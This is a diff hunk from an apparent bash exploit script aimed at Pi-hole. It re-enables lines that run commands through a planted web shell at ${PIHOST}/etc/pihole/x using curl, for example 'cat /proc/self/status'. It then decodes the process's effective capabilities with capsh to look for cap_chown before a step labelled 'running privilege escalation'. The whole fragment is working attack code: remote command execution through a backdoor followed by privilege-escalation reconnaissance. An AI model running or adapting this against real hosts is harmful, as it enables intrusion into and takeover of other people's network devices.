@@ -179,17 +179,17 @@ echo "[*] result: ${reslog}"
 # #echo "[*] result: ${reslog}"
 # echo "[*] sleeping for 10s to give FTL time to restart..";sleep 10
 
-# # check for cap_chown in our current caps
-# reslog="$( curl -sk --url-query "cmd=cat /proc/self/status" "${PIHOST}/etc/pihole/x" | grep -ie CapEff | awk '{ print $2 }' )"
-# if [ "${reslog}x" == "x" ];then
-#   echo "[-] did not get current caps from cmd shell. is cmd shell still up?"
-#   exit 1
-# fi
-# echo "[*] Current effective caps: ${reslog}"
-# decoded="$( capsh --decode="${reslog}" )"
-# echo "[*] decoded caps: ${decoded}"
+# check for cap_chown in our current caps
+reslog="$( curl -sk --url-query "cmd=cat /proc/self/status" "${PIHOST}/etc/pihole/x" | grep -ie CapEff | awk '{ print $2 }' )"
+if [ "${reslog}x" == "x" ];then
+ echo "[-] did not get current caps from cmd shell. is cmd shell still up?"
+ exit 1
+fi
+echo "[*] Current effective caps: ${reslog}"
+decoded="$( capsh --decode="${reslog}" )"
+echo "[*] decoded caps: ${decoded}"
 # if [[ "${decoded}" != *"cap_chown"* ]];then
-#   echo "[-] no cap_chown in current caps: ${decoded}"
+#  echo "[-] no cap_chown in current caps: ${decoded}"
 # fi
 
 echo "[*] running privilege escalation"
